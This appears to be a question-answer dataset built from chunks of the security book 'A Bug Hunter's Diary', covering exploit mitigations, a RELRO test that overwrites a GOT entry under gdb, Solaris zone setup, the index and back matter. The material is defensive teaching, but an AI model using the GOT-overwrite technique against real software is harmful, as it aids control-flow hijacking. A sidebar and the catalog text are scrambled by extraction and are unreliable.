Explorer. Note that\nthe Java DLLs that have been loaded into the context of Internet\nExplorer do not make use of ASLR (denoted by an empty value for\nthe ASLR column in the lower pane). Microsoft has also released\na tool called BinScope Binary Analyzer,8 which analyzes binaries for a\nwide variety of security protections with a straightforward, easy-to-use\ninterface.\nIf both DEP and ASLR are correctly deployed, exploit develop-\nment is a lot harder.\nTo see if a Windows binary supports the security cookie (/GS)\nmitigation technique, you can disassemble the binary with IDA Pro\nand look for references to the security cookie in the function epi-\nlogue and prologue, as shown in Figure C-2.\nMitigation 181\nFigure C-1: DEP and ASLR status shown in Process Explorer\nFigure C-2: Security cookie (/GS) reference in the function prologue and epilogue\n(IDA Pro)\n182 Appendix C",
    "question": "What are the key exploit mitigation techniques discussed in this section and how do they help in preventing memory corruption vulnerabilities from being exploited?",
    "summary": "This appendix explains common exploit mitigation techniques such as ASLR, security cookies, and NX/DEP, which are designed to prevent memory corruption vulnerabilities from being exploited. These techniques make it harder for attackers to predict memory addresses or execute code from data pages. Detecting these mitigations is crucial before attempting to bypass them, as their effectiveness depends on proper implementation and configuration. Tools like Process Explorer and BinScope can help identify which mitigations are in place in an application."
  },
  {
    "start": 84,
    "end": 86,
    "text": "To check the system-wide configurations of Linux systems as well\nas ELF binaries and processes for different exploit mitigation tech-\nniques, you can use my checksec.sh 9 script.\nC.2 relro\nRELRO is a generic exploit mitigation technique to harden the\ndata sections of an ELF10 binary or process. ELF is a common file\nformat for executables and libraries that is used by a variety of UNIX-\nlike systems, including Linux, Solaris, and BSD. RELRO has two\ndifferent modes:\nPartial RELRO\n• Compiler command line: gcc -Wl,-z,relro.\n• The ELF sections are reordered so that the ELF internal data\nsections (.got, .dtors, etc.) precede the program’s data sections\n(.data and .bss).\n• Non-PLT GOT is read-only.\n• PLT-dependent GOT is still writeable.\nFull RELRO\n• Compiler command line: gcc -Wl,-z,relro,-z,now.\n• Supports all the features of Partial RELRO.\n• Bonus: The entire GOT is (re)mapped as read-only.\nBoth Partial and Full RELRO reorder the ELF internal data sec-\ntions to protect them from being overwritten in the event of a buffer\noverflow in the program’s data sections (.data and .bss), but only Full\nRELRO mitigates the popular technique of modifying a GOT entry to\nget control over the program execution flow (see Section A.4).\nTo demonstrate the RELRO mitigation technique, I made up two\nsimple test cases. I used Debian Linux 6.0 as a platform.\nTest Case 1: Partial RELRO\nThe test program in Listing C-1 takes a memory address (see line 6)\nand tries to write the value 0x41414141 at that address (see line 8).\n01 #include <stdio.h>\n02\n03 int\n04 main (int argc, char *argv[])\n05 {\n06 size_t *p = (size_t *)strtol (argv[1], NULL, 16);\n07\nMitigation 183\n08 p[0] = 0x41414141;\n09 printf (“RELRO: %p\\n”, p);\n10\n11 return 0;\n12 }\nListing C-1: Example code used to demonstrate RELRO (testcase.c)\nI compiled the program with Partial RELRO support:\nlinux$ gcc -g -Wl,-z,relro -o testcase testcase.c\nI then checked the resulting binary with my checksec.sh script:11\nlinux$ ./checksec.sh --file testcase\nRELRO STACK CANARY NX PIE FILE\nPartial RELRO No canary found NX enabled No PIE testcase\nNext I used objdump to gather the GOT address of the printf()\nlibrary function used in line 9 of Listing C-1 and then tried to over-\nwrite that GOT entry:\nlinux$ objdump -R ./testcase | grep printf\n0804a00c R_386_JUMP_SLOT printf\nI started the test program in gdb in order to see exactly what was\nhappening:\nlinux$ gdb -q ./testcase\n(gdb) run 0804a00c\nStarting program: /home/tk/BHD/testcase 0804a00c\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) info registers eip\neip 0x41414141 0x41414141\nResult: If only Partial RELRO is used to protect an ELF binary, it\nis still possible to modify arbitrary GOT entries to gain control of the\nexecution flow of a process.\nTest Case 2: Full RELRO\nThis time, I compiled the test program with Full RELRO support:\nlinux$ gcc -g -Wl,-z,relro,-z,now -o testcase testcase.c\nlinux$ ./checksec.sh --file testcase\nRELRO STACK CANARY NX PIE FILE\nFull RELRO No canary found NX enabled No PIE testcase\n184 Appendix C\nI then tried to overwrite the GOT address of printf() again:\nlinux$ objdump -R ./testcase | grep printf\n08049ff8 R_386_JUMP_SLOT printf\nlinux$ gdb -q ./testcase\n(gdb) run 08049ff8\nStarting program: /home/tk/BHD/testcase 08049ff8\nProgram received signal SIGSEGV, Segmentation fault.\n0x08048445 in main (argc=2, argv=0xbffff814) at testcase.c:8\n8 p[0] = 0x41414141;\nThis time, the execution flow was interrupted by a SIGSEGV signal\nat source code line 8. Let’s see why:\n(gdb) set disassembly-flavor intel\n(gdb) x/1i $eip\n0x8048445 <main+49>: mov DWORD PTR [eax],0x41414141\n(gdb) info registers eax\neax 0x8049ff8 134520824\nAs expected, the program tried to write the value 0x41414141 at the\ngiven memory address 0x8049ff8.\n(gdb) shell cat /proc/$(pidof testcase)/maps\n08048000-08049000 r-xp 00000000 08:01 497907 /home/tk/testcase\n08049000-0804a000 r--p 00000000 08:01 497907 /home/tk/testcase\n0804a000-0804b000 rw-p 00001000 08:01 497907 /home/tk/testcase\nb7e8a000-b7e8b000 rw-p 00000000 00:00 0\nb7e8b000-b7fcb000 r-xp 00000000 08:01 181222 /lib/i686/cmov/libc-2.11.2.so\nb7fcb000-b7fcd000 r--p 0013f000 08:01 181222 /lib/i686/cmov/libc-2.11.2.so\nb7fcd000-b7fce000 rw-p 00141000 08:01 181222 /lib/i686/cmov/libc-2.11.2.so\nb7fce000-b7fd1000 rw-p 00000000 00:00 0\nb7fe0000-b7fe2000 rw-p 00000000 00:00 0\nb7fe2000-b7fe3000 r-xp 00000000 00:00 0 [vdso]\nb7fe3000-b7ffe000 r-xp 00000000 08:01 171385 /lib/ld-2.11.2.so\nb7ffe000-b7fff000 r--p 0001a000 08:01 171385 /lib/ld-2.11.2.so\nb7fff000-b8000000 rw-p 0001b000 08:01 171385 /lib/ld-2.11.2.so\nbffeb000-c0000000 rw-p 00000000 00:00 0 [stack]\nThe memory map of the process shows that the memory range\n08049000-0804a000, which includes the GOT, was successfully set to\nread-only (r--p).\nResult: If Full RELRO is enabled, the attempt to overwrite a\nGOT address leads to an error because the GOT section is mapped\nread-only.\nMitigation 185\nConclusion\nIn case of a buffer overflow in the program’s data sections (.data and\n.bss), both Partial and Full RELRO protect the ELF internal data sec-\ntions from being overwritten.\nWith Full RELRO, it’s possible to successfully prevent the modifi-\ncation of GOT entries.\nThere is also a generic way to implement a similar mitigation\ntechnique for ELF objects, which works on platforms that don’t sup-\nport RELRO.12\nC.3 solaris Zones\nSolaris Zones is a technology used to virtualize operating system ser-\nvices and provide an isolated environment for running applications.\nA zone is a virtualized operating system environment created within\na single instance of the Solaris Operating System. When you create a\nzone, you produce an application execution environment in which\nprocesses are isolated from the rest of the system. This isolation\nshould prevent processes that are running in one zone from moni-\ntoring or affecting processes that are running in other zones. Even a\nprocess running with superuser credentials shouldn’t be able to view\nor affect activity in other zones.\nTerminology\nThere are two different kinds of zones: global and non-global. The\nglobal zone represents the conventional Solaris execution environ-\nment and is the only zone from which non-global zones can be con-\nfigured and installed. By default, non-global zones cannot access\nthe global zone or other non-global zones. All zones have a security\nboundary around them and are confined to their own subtree of the\nfilesystem hierarchy. Every zone has its own root directory, has sepa-\nrate processes and devices, and operates with fewer privileges than\nthe global zone.\nSun and Oracle were very confident about the security of their\nZones technology when they rolled it out:\nThe platform that → Once a process has been placed in a zone other than the\nI used throughout global zone, neither the process nor any of its subsequent\nthis section was the children can change zones.\ndefault\ninstallation\no x f 8 S 6 o / l x a 6 ri 4 s 1 D 0 V D 1 0 f / u 0 ll 8 Network services can be run in a zone. By running network\nImage (sol-10- services in a zone, you limit the damage possible in the\nu6-ga1-x86-dvd. event of a security violation. An intruder who successfully\niso), which is exploits a security flaw in software running within a zone is\ncalled Solaris 10\nGeneric_137138-09.\n186 Appendix C",
    "question": "What is the difference between Partial RELRO and Full RELRO in terms of how they protect the GOT section of an ELF binary from being overwritten?",
    "summary": "The text explains how to check Linux system configurations and ELF binaries for exploit mitigation techniques using checksec.sh. It describes RELRO, a method to protect data sections of ELF binaries by making the GOT read-only, with two modes: Partial and Full RELRO. Full RELRO provides stronger protection by making the entire GOT read-only, preventing exploitation through GOT entry modification."
  },
  {
    "start": 87,
    "end": 88,
    "text": "confined to the restricted set of actions possible within that\nzone. The privileges available within a zone are a subset of\nthose available in the system as a whole. . . 13\nProcesses are restricted to a subset of privileges. Privilege\nrestriction prevents a zone from performing operations\nthat might affect other zones. The set of privileges limits\nthe capabilities of privileged users within the zone. To\ndisplay the list of privileges available within a zone, use the\nppriv utility.14\nSolaris Zones is great, but there is one weak point: All zones\n(global and non-global) share the same kernel. If there is a bug in\nthe kernel that allows arbitrary code execution, it’s possible to cross\nall security boundaries, escape from a non-global zone, and compro-\nmise other non-global zones or even the global zone. To demonstrate\nthis, I recorded a video that shows the exploit for the vulnerability\ndescribed in Chapter 3 in action. The exploit allows an unprivileged\nuser to escape from a non-global zone and then compromise all\nother zones, including the global zone. You can find the video on\nthis book’s website.15\nSet Up a Non-Global Solaris Zone\nTo set up the Solaris Zone for Chapter 3, I did the following steps (all\nsteps have to be performed as a privileged user in the global zone):\nsolaris# id\nuid=0(root) gid=0(root)\nsolaris# zonename\nglobal\nThe first thing I did was to create a filesystem area for the new\nzone to reside in:\nsolaris# mkdir /wwwzone\nsolaris# chmod 700 /wwwzone\nsolaris# ls -l / | grep wwwzone\ndrwx------ 2 root root 512 Aug 23 12:45 wwwzone\nI then used zonecfg to create the new non-global zone:\nsolaris# zonecfg -z wwwzone\nwwwzone: No such zone configured\nUse ‘create’ to begin configuring a new zone.\nzonecfg:wwwzone> create\nzonecfg:wwwzone> set zonepath=/wwwzone\nMitigation 187\nzonecfg:wwwzone> set autoboot=true\nzonecfg:wwwzone> add net\nzonecfg:wwwzone:net> set address=192.168.10.250\nzonecfg:wwwzone:net> set defrouter=192.168.10.1\nzonecfg:wwwzone:net> set physical=e1000g0\nzonecfg:wwwzone:net> end\nzonecfg:wwwzone> verify\nzonecfg:wwwzone> commit\nzonecfg:wwwzone> exit\nAfter that, I checked the results of my actions with zoneadm:\nsolaris# zoneadm list -vc\nID NAME STATUS PATH BRAND IP\n0 global running / native shared\n- wwwzone configured /wwwzone native shared\nNext, I installed and booted the new non-global zone:\nsolaris# zoneadm -z wwwzone install\nPreparing to install zone <wwwzone>.\nCreating list of files to copy from the global zone.\nCopying <8135> files to the zone.\nInitializing zone product registry.\nDetermining zone package initialization order.\nPreparing to initialize <1173> packages on the zone.\nInitialized <1173> packages on zone.\nZone <wwwzone> is initialized.\nsolaris# zoneadm -z wwwzone boot\nTo ensure that everything had gone okay, I pinged the IP address\nof the new non-global zone:\nsolaris# ping 192.168.10.250\n192.168.10.250 is alive\nTo log into the new non-global zone, I used the following\ncommand:\nsolaris# zlogin -C wwwzone\nAfter answering the questions regarding language and terminal\nsettings, I logged in as root and created a new unprivileged user:\nsolaris# id\nuid=0(root) gid=0(root)\nsolaris# zonename\nwwwzone\n188 Appendix C\nsolaris# mkdir /export/home\nsolaris# mkdir /export/home/wwwuser\nsolaris# useradd -d /export/home/wwwuser wwwuser\nsolaris# chown wwwuser /export/home/wwwuser\nsolaris# passwd wwwuser\nI then used this unprivileged user to exploit the Solaris kernel\nvulnerability described in Chapter 3.\nMitigation 189\nnotes\n1. See Rob King, “New Leopard Security Features—Part I: ASLR,” DVLabs\nTipping Point (blog), November 7, 2007, http://dvlabs.tippingpoint.com/\nblog/2007/11/07/leopard-aslr.\n2. See Tim Burrell, “GS Cookie Protection—Effectiveness and Limitations,”\nMicrosoft TechNet Blogs: Security Research & Defense (blog), March 16, 2009,\nhttp://blogs.technet.com/srd/archive/2009/03/16/gs-cookie-protection-effectiveness-\nand-limitations.aspx; “Enhanced GS in Visual Studio 2010,” Microsoft TechNet\nBlogs: Security Research & Defense (blog), March 20, 2009, http://blogs.technet\n.com/srd/archive/2009/03/20/enhanced-gs-in-visual-studio-2010.aspx; IBM Research\n“GCC Extension for Protecting Applications from Stack-Smashing Attacks,”\nlast updated August 22, 2005, http://researchweb.watson.ibm.com/trl/projects/\nsecurity/ssp/.\n3. See http://people.redhat.com/mingo/exec-shield/.\n4. See the home page of the PaX team at http://pax.grsecurity.net/ as well as the\ngrsecurity website at http://www.grsecurity.net/.\n5. See Robert Hensing, “Understanding DEP as a Mitigation Technology\nPart 1,” Microsoft TechNet Blogs: Security Research & Defense (blog),\nJune 12, 2009, http://blogs.technet.com/srd/archive/2009/06/12/understanding-\ndep-as-a-mitigation-technology-part-1.aspx.\n6. See http://technet.microsoft.com/en-en/sysinternals/bb896653/.\n7. For more information, see the Secunia study by Alin Rad Pop, “DEP/ASLR\nImplementation Progress in Popular Third-party Windows Applications,” 2010,\nhttp://secunia.com/gfx/pdf/DEP_ASLR_2010_paper.pdf.\n8. To download BinScope Binary Analyzer, visit http://go.microsoft.com/\n?linkid=9678113.\n9. See http://www.trapkit.de/tools/checksec.html.\n10. See TIS Committee, Tool Interface Standard (TIS) Executable and Linking Format\n(ELF) Specification, version 1.2, 1995, http://refspecs.freestandards.org/elf/elf.pdf.\n11. See note 9 above.\n12. See Chris Rohlf, “Self Protecting Global Offset Table (GOT),” draft ver-\nsion 1.4, August 2008, http://code.google.com/p/em386/downloads/detail?name=\nSelf-Protecting-GOT.html.\n13. See “Introduction to Solaris Zones: Features Provided by Non-Global Zones,”\nSystem Administration Guide: Oracle Solaris Containers—Resource Management and\nOracle Solaris Zones, 2010, http://download.oracle.com/docs/cd/E19455-01/817-1592/\nzones.intro-9/index.html.\n14. See “Solaris Zones Administration (Overview): Privileges in a Non-Global\nZone,” System Administration Guide:Virtualization Using the Solaris Operating System,\n2010, http://download.oracle.com/docs/cd/E19082-01/819-2450/z.admin.ov-18/\nindex.html.\n15. See http://www.trapkit.de/books/bhd/.\n190 Appendix C\ninDex\nNumbers Audio Toolbox (Apple iOS\n4.4BSD, 130 audio framework), 134\n4X movie file format, 53 avast! antivirus product, 87\nA B\nAAC (Advanced Audio Blue Screen of Death (BSoD), 109\nCoding), 136 brute force technique, 63, 125\nActiveX, 71 BSoD (Blue Screen of Death), 109\nAddress Space Layout Random- buffer overflows, 5, 9, 81, 142,\nization (ASLR), 19–21, 149, 180, 183\n179–182 bug hunting, definition of, 3\nAdvanced Audio Coding\nC\n(AAC), 136\nALWIL Software, 87 Celestial (Apple iOS audio\nantivirus products, 87 framework), 134\nApache webserver, 137 checksec.sh, 183–184\nApple Cisco, 71, 84\nGNU Debugger version, 173 Common Vulnerabilities and\niPhone, 133 Exposures Identifiers\nMacBook, 113 (CVE-IDs), 23\nARM CPU, 7, 140, 146 CVE-2007-4686, 130\nassembly syntax CVE-2008-568, 49\nAT&T, 124, 173 CVE-2008-1625, 110\nIntel, 93, 140, 173 CVE-2008-3558, 84\nASLR (Address Space Layout CVE-2008-4654, 22\nRandomization) 19–21, CVE-2009-0385, 69\n179–182 CVE-2010-0036, 147\nCOMRaider, 72 Executable and Linkable Format\ncoordinated disclosure, 18 (ELF), 61, 157\nCore Audio (Apple iOS audio exploit, 3\nframework), 134 for avast! antivirus product\ncross-site scripting (XSS), 75 vulnerability, 110\nCTL_CODE, 97 development of, 8\nCurrentStackLocation, 95 for FFmpeg vulnerability, 65\nCVE-IDs. See Common Vulner- for Mac OS X kernel vulner-\nabilities and Exposures ability, 129\nIdentifiers for Sun Solaris kernel vulner-\nCygwin environment, 21 ability, 48\nfor VLC media player vulner-\nD ability, 18\nData Execution Prevention for WebEx vulnerability, 83\n(DEP), 19–21, 179–182\nF\ndata transfer type, 97\ndebuggers, 6 FFmpeg multimedia library,\nThe GNU Debugger (gdb), 51, 155\n7, 121, 140, 171–176 FreeBSD, 130\nImmunity Debugger, 7, 16 full disclosure, 18, 84\nThe Modular Debugger fuzzing, 4, 134\n(mdb), 7, 37, 163–165\nOllyDbg, 7 G\nWinDbg, 7, 76–77, 92–95, 99, gdb (The GNU Debugger), 7,\n107, 165–170 121, 140, 171–176\ndemuxer, 10, 52 Global Offset Table (GOT), 61,\nDEP (Data Execution Preven- 67, 157, 183\ntion), 19–21, 179–182 GNU Debugger, The (gdb), 7,\nDeviceIoControl(), 90 121, 140, 171–176\nDirect Kernel Object Manipula- GOT overwrite, 67, 157–161\ntion (DKOM), 110 /GS, 19, 152, 179–182\ndisassemblers, 7\nDispCallFunc(), 76 H\nDKOM (Direct Kernel Object\nheap buffer overflows, 149. See\nManipulation), 110\nalso buffer overflows\ndouble frees, 6\nheap-memory management, 6\nDRIVER_OBJECT, 90\nheap mitigation techniques, 179\nDriverView, 88\nheap spraying techniques, 83, 129\ndynamic analysis, 4\nI\nE\nIDA Pro (Interactive Disassem-\nELF (Executable and Linkable\nbler Professional), 7, 78,\nFormat), 61, 157\n88, 181\nEnhanced Mitigation Experi-\nImmunity Debugger, 7, 16\nence Toolkit (EMET), 22\n192 Index\ninput/output controls (IOCTL), little-endian, 17, 143\n26, 88, 113 LookingGlass, 21\nioctl(), 115\nM\ninstruction alignment, 146\ninstruction pointer, 7, 150 Mac OS X, 7, 113, 173\nIntel, 7, 149 mdb (The Modular Debugger),\nInteractive Disassembler Profes- 7, 37, 163–165\nsional (IDA Pro), 7, 78, mediaserverd, 134\n88, 181 memcpy(), 101, 142\nInternet Explorer, 71 memory corruption, 6, 140,\nIoCreateDevice(), 88 149, 157\nIOCTL (input/output controls), memory errors, 6\n26, 88, 113 memory leak, 129, 140\nioctl(), 115 METHOD_BUFFERED, 99\nI/O request packet (IRP), 95 MindshaRE, 76\n_IO_STACK_LOCATION, 96 mmap(), 44\niPhone, 133 MobileSafari, 133\nIRP (I/O request packet), 95 Modular Debugger, The (mdb),\nIRP_MJ_DEVICE_CONTROL, 90 7, 37, 163–165\nMost Significant Bit (MSB), 156\nmovie header atom, 144\nJ\nmovsx, 5\njmp reg technique, 18, 19\nMSB (Most Significant Bit), 156\nK N\nkernel debugging, 7, 37, 88, 121, non-maskable interrupt\n167, 173 (NMI), 122\nKernel Debug Kit, 174 NULL pointer dereference, 6,\nkernel driver, 87 32, 51, 153–154\nkernel panic, 32, 37–38, 120, 165\nO\nkernel space, 39, 102\nKeSetEvent(), 107 objdump, 63, 161, 184\nOS X, 7, 113, 173\nL\nP\nLinux\nparser, 9\nDebian, 157, 183\nPLT (Procedure Linkage Table),\ndebugging the Mac OS X\n158–160\nkernel with, 121, 173\nprivilege escalation, 110, 129\nand exploit mitigation tech-\nProcedure Linkage Table (PLT),\nniques, 180, 183\n158–160\nfuzzing the iPhone with, 134\nprogram counter, 7, 150\ngdb, debugger for, 7\nPython, 74\nRed Hat, 173\nstack buffer overflows\nQ\nunder, 151\nQuickTime (File Format Specifi-\nUbuntu, 56, 63, 151\ncation), 144\nIndex 193\nR U\nreadelf, 161 uninitialized variables, 6\nRELRO, 67–69, 183–186 user space, 27, 39, 51, 90, 129\nrep movsd, 101\nresponsible disclosure, 18 V\nreturn address (RET), 150 VBScript, 74\nruntime link editor (rtld), VCP (Vulnerability Contributor\n157, 159 Program), 18, 84\nVerisign iDefense Labs, Vul-\nS\nnerability Contributor\nsaved frame pointer (SFP), Program (VCP), 18, 84\n150–151 VideoLAN, 9\nsecurity advisories VirusTotal, 87\nTKADV2007-001, 131 VLC media player, 9, 51, 65\nTKADV2008-002, 111 VMware, 88, 167–170\nTKADV2008-009, 85 vulnerability brokers, 18\nTKADV2008-010, 24 Tipping Point, 18\nTKADV2008-015, 50 Verisign iDefense Labs, 18, 84\nTKADV2009-004, 70 Vulnerability Contribution Pro-\nTKADV2010-002, 148 gram (VCP), 18, 84\nsecurity cookie, 19, 152, 179-182 vulnerability rediscovery, 84\nSFP (saved frame pointer),\n150–151 W\nsign bit, 156 WebEx Meeting Manager, 71\nsign-extension vulnerabilities, 5 WinDbg, 7, 76–77, 92–95, 99,\nSiteLock, 84 107, 165–170\nSolaris Windows I/O manager, 95\nkernel, 25 Windows Vista, 10, 19, 152,\nmdb, debugger for, 7 156, 181\nSolaris Zones, 39, 186-189 Windows XP, 71, 88, 107, 167, 180\nsprintf(), 80 WinObj, 90\nstack buffer overflows, 149. See\nalso buffer overflows X\nstack canary, 151, 180\nXNU kernel, 113, 174\nstack frame, 150\nXSS (cross-site scripting), 75\nstatic analysis, 4\nxxd, 136\nSTREAMS, 27\nZ\nT\nZero Day Initiative (ZDI), 18\nTipping Point, Zero Day Initia-\nzero page, 39–46, 153\ntive (ZDI), 18\nTiVo file format, 10\ntype conversion, 51, 117, 154\n194 Index",
    "question": "",
    "summary": "Solaris Zones restrict processes to a subset of system privileges, limiting their ability to affect other zones. However, a shared kernel can be a security weakness, allowing exploits to bypass boundaries and compromise all zones. The text describes setting up a non-global zone, installing it, and using an unprivileged user to exploit a kernel vulnerability."
  },
  {
    "start": 89,
    "end": 89,
    "text": "Updates\nVisit http://nostarch.com/bughunter.htm for updates, errata, and\nother information.\nMore no-nonsense books from no starch press\nMetasploit practical packet the ida pro book,\nthe penetration tester’s Guide analysis, 2nd edition 2nd edition\nby david kennedy, jim o’gorman, Using Wireshark to solve the Unofficial Guide to the World’s\ndevon kearns, and mati aharoni real-World network problems Most popular disassembler\njuly 2011, 328 pp., $49.95\nisbn 978-1-59327-288-3 by chris sanders by chris eagle\njuly 2011, 280 pp., $49.95 july 2011, 672 pp., $69.95\nisbn 978-1-59327-266-1 isbn 978-1-59327-289-0\nthe tanGled Web hackinG, 2nd edition practical MalWare\na Guide to securing the art of exploitation analysis\nModern Web applications by jon erickson the hands-on Guide to\nn b is y o b m v n e i 9 c m 7 h b 8 a e - l r 1 - z 2 5 a 0 9 l 1 3 e 1 2 w , 7 3 s -3 k 2 8 i 0 8 p - p 0 ., $49.95 f is e b b n r u 9 a 7 r 8 y -1 2 -5 0 9 0 3 8 2 , 7 4 - 8 1 8 4 4 p - p 2 . w/cd, $49.95 d b\na\ny\nn\ni s m\nd\nse\nr\nic c\ne\nt h\nw\nin a\nh\ng e\no\nl M\nn\ns a i\ni\nl k\ng\nic o i r o s u k s i s a o n ft d w are\njanuary 2012, 760 pp., $59.95\nisbn 978-1-59327-290-6\nphone: email:\n800.420.7240 or sales@nostarch.com\n415.863.9900\nweb:\nwww.nostarch.com\nA Bug Hunter’s Diary is set in New Baskerville, TheSansMono\nCondensed, Futura, Segoe, and Bodoni.\nThe book was printed and bound by Malloy Incorporated in\nAnn Arbor, Michigan. The paper is Spring Forge 60# Antique,\nwhich is certified by the Sustainable Forestry Initiative (SFI).\nThe book has a RepKover binding, which allows it to lie flat\nwhen open.\n“Give a man an exploit and you make him a hacker for\na day; teach a man to exploit bugs and you make him a\nhacker for a lifetime.” — Felix “FX” Lindner\nSeemingly simple bugs can have * Develop proof-of-concept code\ndrastic consequences, allowing that verifies the security flaw\nattackers to compromise systems,\n* Report bugs to vendors or third-\nescalate local privileges, and\nparty brokers\notherwise wreak havoc on a system.\nA Bug Hunter’s Diary is packed with\nA Bug Hunter’s Diary follows\nreal-world examples of vulnerable\nsecurity expert Tobias Klein as he\ncode and the custom programs used\ntracks down and exploits bugs in\nto find and test bugs. Whether you’re\nsome of the world’s most popular\nhunting bugs for fun, for profit, or to\nsoftware, like Apple’s iOS, the VLC\nmake the world a safer place, you’ll\nmedia player, web browsers, and\nlearn valuable new skills by looking\neven the Mac OS X kernel. In this\nover the shoulder of a professional\none-of-a-kind account, you’ll see\nbug hunter in action.\nhow the developers responsible for\nthese flaws patched the bugs — or\nfailed to respond to them at all. AbOUT ThE AUThOR\nAlong the way you’ll learn how to: Tobias Klein is a security researcher\nand founder of NESO Security Labs,\n* Use field-tested techniques to\nan information security consulting\nfind bugs, like identifying and\nand research company. he is the\ntracing user input data and\nauthor of two information security\nreverse engineering\nbooks published in the German\n* Exploit vulnerabilities like language by dpunkt.verlag.\nNULL pointer dereferences,\nbuffer overflows, and type\nconversion flaws\n“I LAY FLAT.” This book uses RepKover — a durable binding that won’t snap shut.\nTHE FINEST IN GEEK ENTERTAINMENT™\nwww.nostarch.com $39.95 ($41.95 CDN) Shelve In:\nComputers/Security",
    "question": "What is the main focus of \"A Bug Hunter’s Diary\"?",
    "summary": "A Bug Hunter’s Diary by Tobias Klein explores real-world examples of software vulnerabilities and how they were exploited and fixed. It includes detailed code examples and insights from a professional bug hunter. The book provides practical knowledge on identifying and testing security flaws in popular software like iOS and VLC."
  }
]